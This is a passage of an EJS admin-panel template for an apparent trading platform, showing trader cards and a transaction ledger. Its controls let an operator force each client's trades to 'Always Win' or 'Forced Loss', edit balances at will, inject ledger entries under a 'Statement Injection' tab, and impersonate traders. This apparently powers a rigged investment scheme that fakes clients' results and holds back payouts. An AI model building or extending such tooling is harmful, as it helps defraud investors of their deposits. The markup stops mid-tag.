                                                <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                                <input type="hidden" name="user_id" value="<%= u.id %>" />
                                                <button type="submit" 
                                                        class="p-1 rounded-lg text-slate-400 hover:text-rose-400 hover:bg-rose-500/10 transition cursor-pointer" 
                                                        title="Delete User"><svg class="w-3.5 h-3.5 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg></button>
                                            </form>
                                        <% } %>
                                    </div>
                                </td>
                            </tr>
                        <% }) %>
                    </tbody>
                </table>
            </div>

            <!-- Mobile Trader Cards Stack -->
            <div class="md:hidden space-y-3">
                <% users.forEach(u => { %>
                    <div x-show="matchesTrader('<%= (u.name || '').replace(/['\\]/g, '') %>', '<%= (u.email || '').replace(/['\\]/g, '') %>', <%= u.id %>, '<%= u.role %>')"
                         class="luxury-glass-card p-4 rounded-2xl border border-white/[0.08] space-y-3 bg-[#161617]/90 shadow-lg">
                        <div class="flex items-start justify-between gap-2">
                            <div class="flex items-center space-x-3 min-w-0">
                                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-sky-500/20 to-primary/30 border border-sky-400/40 text-sky-300 font-black font-serif flex items-center justify-center flex-shrink-0 text-sm shadow-md">
                                    <%= (u.name && u.name.length > 0) ? u.name[0].toUpperCase() : 'U' %>
                                </div>
                                <div class="min-w-0">
                                    <div class="flex items-center space-x-1.5 flex-wrap">
                                        <span class="font-extrabold text-white text-sm truncate"><%= u.name %></span>
                                        <span class="text-[9px] font-mono text-sky-400 bg-sky-500/10 px-1.5 py-0.2 rounded border border-sky-500/20">#<%= u.id %></span>
                                        <% if (u.role === 'admin') { %>
                                            <span class="text-[9px] font-mono font-bold bg-amber-500/20 text-amber-300 border border-amber-500/30 px-1 rounded">ADMIN</span>
                                        <% } %>
                                    </div>
                                    <div class="text-[11px] text-slate-400 font-mono truncate mt-0.5"><%= u.email %></div>
                                </div>
                            </div>
                            <div class="flex-shrink-0">
                                <% if (u.kyc_status === 'approved') { %>
                                    <span class="pill-emerald text-[9px] py-0 px-1.5">TIER 1</span>
                                <% } else if (u.kyc_status === 'pending') { %>
                                    <span class="pill-amber text-[9px] py-0 px-1.5">⏳ IN REVIEW</span>
                                <% } else { %>
                                    <span class="text-[10px] text-slate-500 font-mono">Unverified</span>
                                <% } %>
                            </div>
                        </div>

                        <!-- Balance & Algorithm -->
                        <div class="grid grid-cols-2 gap-2 bg-black/40 p-2.5 rounded-xl border border-white/[0.06] text-xs">
                            <div>
                                <span class="text-[10px] text-slate-400 uppercase font-mono block">Custody Balance</span>
                                <div class="flex items-center space-x-1.5 mt-0.5">
                                    <span class="font-black text-emerald-400 font-mono text-sm sm:text-base">$<%= Number(u.balance).toLocaleString(undefined, {minimumFractionDigits: 2}) %></span>
                                    <button type="button" @click="openSetBalanceModal(<%= JSON.stringify(u) %>)" class="text-sky-400 hover:text-sky-300 text-[10px] font-mono underline cursor-pointer">Edit</button>
                                </div>
                            </div>
                            <div>
                                <span class="text-[10px] text-slate-400 uppercase font-mono block">Trade Outcome</span>
                                <form action="/babyoku/user/trade-mode" method="POST" class="mt-1">
                                    <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                    <input type="hidden" name="user_id" value="<%= u.id %>" />
                                    <select name="trade_mode" onchange="this.form.submit()" 
                                            class="w-full bg-[#0B0F19] border border-white/[0.12] <%= u.trade_mode === 'always_win' ? 'text-emerald-400' : (u.trade_mode === 'always_loss' ? 'text-rose-400' : 'text-slate-200') %> text-[10px] rounded-lg px-2 py-1 outline-none font-bold font-mono cursor-pointer">
                                        <option value="normal" <%= (u.trade_mode || 'normal') === 'normal' ? 'selected' : '' %>>Normal</option>
                                        <option value="always_win" <%= u.trade_mode === 'always_win' ? 'selected' : '' %>>🟢 Always Win</option>
                                        <option value="always_loss" <%= u.trade_mode === 'always_loss' ? 'selected' : '' %>>🔴 Forced Loss</option>
                                    </select>
                                </form>
                            </div>
                        </div>

                        <!-- Touch Actions: Clear, focused Impersonation Button -->
                        <div class="flex items-center gap-1.5 pt-1">
                            <a href="/babyoku/user/impersonate/<%= u.id %>" 
                               class="flex-1 btn-cyber btn-cyber-primary text-xs py-2 px-3 font-bold justify-center inline-flex items-center space-x-1.5 shadow-md shadow-sky-500/20">
                                <svg class="w-4 h-4 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"/></svg>
                                <span>Login as Trader</span>
                            </a>
                            <button type="button" @click="selectedUserTx = <%= JSON.stringify(u) %>; addTxModal = true" 
                                    class="btn-cyber btn-cyber-ghost text-xs py-2 px-2.5 font-mono cursor-pointer" title="Add Transaction">
                                + TX
                            </button>
                            <button type="button" @click="selectedUserId = <%= u.id %>; resetPassModal = true" 
                                    class="btn-cyber btn-cyber-ghost text-xs py-2 px-2 font-mono cursor-pointer" title="Reset Password">
                                Pass
                            </button>
                            <% if (u.role !== 'admin' && u.id !== (typeof user !== 'undefined' && user ? user.id : 0)) { %>
                                <form action="/babyoku/user/delete" method="POST" class="inline-block" onsubmit="return confirm('Permanently delete user #<%= u.id %> (<%= u.name %>)?');">
                                    <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                    <input type="hidden" name="user_id" value="<%= u.id %>" />
                                    <button type="submit" class="p-2 rounded-lg text-slate-500 hover:text-rose-400 hover:bg-rose-500/10 transition cursor-pointer" title="Delete User">
                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                                    </button>
                                </form>
                            <% } %>
                        </div>
                    </div>
                <% }) %>
            </div>
        </div>

        <!-- ============================================================================== -->
        <!-- TAB 4: TRANSACTION LEDGER & STATEMENT INJECTION                                -->
        <!-- ============================================================================== -->

        <!-- TAB 4: TRANSACTION LEDGER & STATEMENT INJECTION                                -->
        <!-- ============================================================================== -->

        <div x-show="activeTab === 'transactions'" class="space-y-6" x-cloak>
            
            <!-- Treasury Liquidity & Settlement Bar -->
            <div class="luxury-glass-panel rounded-3xl p-6 sm:p-8 shadow-2xl border border-white/[0.08] space-y-4">
                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/[0.08] pb-4">
                    <div>
                        <div class="inline-flex items-center space-x-2 px-3 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[10px] uppercase font-bold font-mono mb-1">
                            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                            <span>Institutional Treasury & Settlement Engine</span>
                        </div>
                        <h2 class="text-xl md:text-2xl font-extrabold font-serif text-white">Financial Transactions & Liquidity Ledger</h2>
                        <p class="text-xs text-slate-400 font-mono">Real-time deposit confirmations, multi-sig withdrawal moderation, and verified settlement tracking.</p>
                    </div>
                    <div class="flex items-center space-x-2 font-mono text-xs">
                        <% if (totalStats.pendingWithdrawals > 0) { %>
                            <span class="pill-amber">
                                <span class="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse"></span>
                                <span><%= totalStats.pendingWithdrawals %> Pending Payouts</span>
                            </span>
                        <% } %>
                    </div>
                </div>

                <!-- Treasury Liquidity Cards -->
                <div class="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 font-mono text-xs pt-1">
                    <div class="p-3.5 sm:p-4 rounded-2xl bg-black/40 border border-white/[0.06] space-y-1">
                        <span class="text-[9px] sm:text-[10px] uppercase text-slate-400 font-bold block truncate">Gross Inflows</span>
                        <p class="text-lg sm:text-xl font-black text-emerald-400 font-serif truncate">$<%= Number(totalStats.totalDeposits).toLocaleString(undefined, {minimumFractionDigits: 2}) %></p>
                        <span class="text-[9px] sm:text-[10px] text-slate-400 truncate block">Verified On-Chain/Fiat</span>
                    </div>

                    <div class="p-3.5 sm:p-4 rounded-2xl bg-black/40 border border-white/[0.06] space-y-1">
                        <span class="text-[9px] sm:text-[10px] uppercase text-slate-400 font-bold block truncate">Settled Outflows</span>
                        <p class="text-lg sm:text-xl font-black text-rose-400 font-serif truncate">$<%= Number(totalStats.totalWithdrawals).toLocaleString(undefined, {minimumFractionDigits: 2}) %></p>
                        <span class="text-[9px] sm:text-[10px] text-slate-400 truncate block">Disbursed to Clients</span>
                    </div>

                    <div class="p-3.5 sm:p-4 rounded-2xl bg-black/40 border border-white/[0.06] space-y-1">
                        <span class="text-[9px] sm:text-[10px] uppercase text-slate-400 font-bold block truncate">Pending Review</span>
                        <p class="text-lg sm:text-xl font-black text-amber-400 font-serif truncate"><%= totalStats.pendingWithdrawals %> Payouts</p>
                        <span class="text-[9px] sm:text-[10px] text-slate-400 truncate block">Requires Sign-Off</span>
                    </div>

                    <div class="p-3.5 sm:p-4 rounded-2xl bg-black/40 border border-white/[0.06] space-y-1">
                        <span class="text-[9px] sm:text-[10px] uppercase text-slate-400 font-bold block truncate">Platform Balance</span>
                        <p class="text-lg sm:text-xl font-black text-sky-400 font-serif truncate">$<%= Number(totalStats.totalBalance).toLocaleString(undefined, {minimumFractionDigits: 2}) %></p>
                        <span class="text-[9px] sm:text-[10px] text-slate-400 truncate block">Client Custody</span>
                    </div>
                </div>
            </div>

            <!-- Transactions Ledger Table (Paginated Page-by-Page) -->
            <div class="luxury-glass-panel rounded-3xl p-6 sm:p-8 shadow-2xl space-y-4"
                 x-data="{
                     txPage: 1,
                     txPerPage: 8,
                     txTotal: <%= transactions.length %>,
                     get txTotalPages() { return Math.max(1, Math.ceil(this.txTotal / this.txPerPage)); }
                 }">
                <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-white/[0.08] pb-3 gap-2">
                    <h3 class="text-sm font-extrabold uppercase tracking-wider text-white font-serif flex items-center space-x-2">
                        <svg class="w-4 h-4 text-sky-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg><span>Complete Treasury Statement Ledger</span>
                    </h3>
                    <div class="flex items-center space-x-3 text-xs font-mono">
                        <span class="text-slate-400">Page <strong class="text-white" x-text="txPage"></strong> of <strong class="text-white" x-text="txTotalPages"></strong> (<%= transactions.length %> total records)</span>
                        <select x-model.number="txPerPage" @change="txPage = 1" class="bg-[#161617] border border-white/10 rounded-lg px-2 py-1 text-xs text-slate-300 outline-none">
                            <option value="5">5 / page</option>
                            <option value="8">8 / page</option>
                            <option value="12">12 / page</option>
                            <option value="20">20 / page</option>
                        </select>
                    </div>
                </div>

                <!-- Desktop Table View -->
                <div class="cyber-table-container overflow-x-auto hidden md:block">
                    <table class="w-full text-left cyber-table">
                        <thead>
                            <tr>
                                <th>Transaction Ref</th>
                                <th>Trader Account</th>
                                <th>Ledger Type</th>
                                <th>Amount</th>
                                <th>Gateway / Asset</th>
                                <th>Settlement Status</th>
                                <th>Audit Description</th>
                                <th class="text-right">Execution Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <% transactions.forEach((t, txIdx) => { %>
                                <tr x-show="Math.floor(<%= txIdx %> / txPerPage) + 1 === txPage">
                                    <td class="font-mono text-slate-400 font-bold">
                                        <%= t.reference || 'TX-' + t.id %>
                                    </td>
                                    <td>
                                        <div class="font-bold text-white"><%= t.user_name %></div>
                                        <div class="text-[10px] text-slate-500 font-mono">#USR-<%= t.user_id %></div>
                                    </td>
                                    <td>
                                        <% if (t.type === 'deposit') { %>
                                            <span class="pill-emerald">DEPOSIT</span>
                                        <% } else if (t.type === 'withdrawal') { %>
                                            <span class="pill-rose">PAYOUT</span>
                                        <% } else if (t.type === 'retirement_yield' || t.type === 'drip') { %>
                                            <span class="pill-sky">DRIP YIELD</span>
                                        <% } else { %>
                                            <span class="pill-sky"><%= t.type.toUpperCase() %></span>
                                        <% } %>
                                    </td>
                                    <td>
                                        <span class="font-black font-mono text-sm <%= t.type === 'deposit' || t.amount >= 0 ? 'text-emerald-400' : 'text-rose-400' %>">
                                            $<%= Number(t.amount).toLocaleString(undefined, {minimumFractionDigits: 2}) %>
                                        </span>
                                    </td>
                                    <td class="text-slate-300 font-mono text-xs">
                                        <span class="px-2 py-0.5 rounded bg-white/[0.05] border border-white/[0.08]"><%= t.method %></span>
                                    </td>
                                    <td>
                                        <% if (t.status === 'completed') { %>
                                            <span class="pill-emerald">SETTLED</span>
                                        <% } else if (t.status === 'pending') { %>
                                            <span class="pill-amber">
                                                <span class="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse"></span>
                                                <span>PENDING REVIEW</span>
                                            </span>
                                        <% } else { %>
                                            <span class="pill-rose">REJECTED</span>
                                        <% } %>
                                    </td>
                                    <td class="text-slate-400 text-[11px] max-w-xs truncate font-mono"><%= t.description %></td>
                                    <td class="text-right space-x-1.5">
                                        <% if (t.status === 'pending') { %>
                                            <form action="/babyoku/transaction/status" method="POST" class="inline-flex space-x-1">
                                                <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                                <input type="hidden" name="transaction_id" value="<%= t.id %>" />
                                                <button type="submit" name="status" value="completed" class="btn-cyber btn-cyber-emerald text-[10px] py-1 px-2.5">
                                                    Approve
                                                </button>
                                                <button type="submit" name="status" value="rejected" class="btn-cyber btn-cyber-rose text-[10px] py-1 px-2.5">
                                                    Reject
                                                </button>
                                            </form>
                                        <% } %>
                                        <form action="/babyoku/transaction/delete" method="POST" class="inline-block" onsubmit="return confirm('Delete this transaction?');">
                                            <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                            <input type="hidden" name="transaction_id" value="<%= t.id %>" />
                                            <button type="submit" class="p-1.5 rounded-lg text-slate-400 hover:text-rose-400 hover:bg-rose-500/10 transition" title="Delete Ledger Entry"><svg class="w-4 h-4 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg></button>
                                        </form>
                                    </td>
                                </tr>
                            <% }) %>
                        </tbody>
                    </table>
                </div>

                <!-- Mobile Transactions Card Stack -->
                <div class="md:hidden space-y-3">
                    <% transactions.forEach((t, txIdx) => { %>
                        <div x-show="Math.floor(<%= txIdx %> / txPerPage) + 1 === txPage" class="luxury-glass-card p-4 rounded-2xl border border-white/[0.08] space-y-3 bg-[#161617]/90 shadow-lg">
                            <div class="flex items-center justify-between">
                                <span class="text-[10px] font-mono text-slate-400 font-bold"><%= t.reference || 'TX-' + t.id %></span>
                                <div>
                                    <% if (t.status === 'completed') { %>
                                        <span class="pill-emerald text-[9px] py-0.5 px-2">SETTLED</span>
                                    <% } else if (t.status === 'pending') { %>
                                        <span class="pill-amber text-[9px] py-0.5 px-2 animate-pulse">PENDING REVIEW</span>
                                    <% } else { %>
                                        <span class="pill-rose text-[9px] py-0.5 px-2">REJECTED</span>
                                    <% } %>
                                </div>
                            </div>

                            <div class="flex items-center justify-between">
                                <div>
                                    <div class="font-bold text-white text-xs"><%= t.user_name %></div>
                                    <div class="text-[10px] text-slate-500 font-mono">#USR-<%= t.user_id %> &bull; <span class="text-slate-400 uppercase font-bold"><%= t.method %></span></div>
                                </div>
                                <div class="text-right">
                                    <div class="font-black font-mono text-base <%= t.type === 'deposit' || t.amount >= 0 ? 'text-emerald-400' : 'text-rose-400' %>">
                                        $<%= Number(t.amount).toLocaleString(undefined, {minimumFractionDigits: 2}) %>
                                    </div>
                                    <div class="text-[9px] font-mono uppercase text-slate-400">
                                        <% if (t.type === 'deposit') { %>
                                            <span class="text-emerald-400 font-bold">DEPOSIT</span>
                                        <% } else if (t.type === 'withdrawal') { %>
                                            <span class="text-rose-400 font-bold">PAYOUT</span>
                                        <% } else { %>
                                            <span><%= t.type %></span>
                                        <% } %>
                                    </div>
                                </div>
                            </div>

                            <% if (t.description) { %>
                                <p class="text-[11px] text-slate-400 font-mono bg-black/30 p-2 rounded-xl truncate"><%= t.description %></p>
                            <% } %>

                            <div class="flex items-center justify-between pt-2 border-t border-white/[0.06] gap-2">
                                <% if (t.status === 'pending') { %>
                                    <form action="/babyoku/transaction/status" method="POST" class="flex items-center space-x-2 w-full">
                                        <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                        <input type="hidden" name="transaction_id" value="<%= t.id %>" />
                                        <button type="submit" name="status" value="completed" class="flex-1 btn-cyber btn-cyber-emerald text-xs py-2 justify-center">
                                            ✓ Approve
                                        </button>
                                        <button type="submit" name="status" value="rejected" class="flex-1 btn-cyber btn-cyber-rose text-xs py-2 justify-center">
                                            ✗ Reject
                                        </button>
                                    </form>
                                <% } else { %>
                                    <span class="text-[10px] text-slate-500 font-mono truncate"><%= t.created_at ? t.created_at.slice(0, 16) : 'Settled' %></span>
                                    <form action="/babyoku/transaction/delete" method="POST" class="inline-block" onsubmit="return confirm('Delete this transaction?');">
                                        <input type="hidden" name="_token" value="<%= csrfToken %>" />
                                        <input type="hidden" name="transaction_id" value="<%= t.id %>" />
                                        <button type="submit" class="p-1.5 rounded-lg text-slate-500 hover:text-rose-400 hover:bg-rose-500/10 transition" title="Delete">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                                        </button>
                                    </form>
                                <% } %>
                            </div>
                        </div>
                    <% }) %>
                </div>

                <!-- Page-by-Page Footer Controls -->
                <div class="pt-4 border-t border-white/[0.08] flex flex-col sm:flex-row items-center justify-between gap-3 text-xs font-mono">
                    <span class="text-slate-400">
                        Showing <strong class="text-white" x-text="txTotal === 0 ? 0 : ((txPage - 1) * txPerPage + 1)"></strong> to <strong class="text-white" x-text="Math.min(txTotal, txPage * txPerPage)"></strong> of <strong class="text-white" x-text="txTotal"></strong> entries
                    </span>
                    <div class="flex items-center space-x-1.5">
                        <button type="button" @click="txPage = 1" :disabled="txPage <= 1"
                                :class="txPage <= 1 ? 'opacity-40 cursor-not-allowed' : 'hover:bg-white/10 text-white'"
                                class="px-2.5 py-1.5 rounded-xl bg-white/[0.04] border border-white/[0.08] text-slate-300 font-bold transition">
                            &laquo;
                        </button>
                        <button type="button" @click="if (txPage > 1) txPage--" :disabled="txPage <= 1"
                                :class="txPage <= 1 ? 'opacity-40 cursor-not-allowed' : 'hover:bg-white/10 text-white'"
                                class="px-3 py-1.5 rounded-xl bg-white/[0.04] border border-white/[0.08] text-slate-300 font-bold transition">
                            &lsaquo; Prev
                        </button>
                        <template x-for="p in txTotalPages" :key="p">
                            <button type="button" x-show="Math.abs(p - txPage) <= 2 || p === 1 || p === txTotalPages"
                                    @click="txPage = p"
                                    :class="p === txPage ? 'bg-sky-500 text-white border-sky-500 font-bold shadow-sm' : 'bg-white/[0.04] text-slate-300 border-white/[0.08] hover:bg-white/10'"
                                    class="w-8 h-8 rounded-xl border transition flex items-center justify-center"
                                    x-text="p"></button>
                        </template>
                        <button type="button" @click="if (txPage < txTotalPages) txPage++" :disabled="txPage >= txTotalPages"
                                :class="txPage >= txTotalPages ? 'opacity-40 cursor-not-allowed' : 'hover:bg-white/10 text-white'"
                                class="px-3 py-1.5 rounded-xl bg-white/[0.04] border border-white/[0.08] text-slate-300 font-bold transition">
                            Next &rsaquo;
                        </button>
                        <button type="button" @click="txPage = txTotalPages" :disabled="txPage >= txTotalPages"
                                :class="txPage >= txTotalPages ? 'opacity-40 cursor-not-allowed' : 'hover:bg-white/10 text-white'"
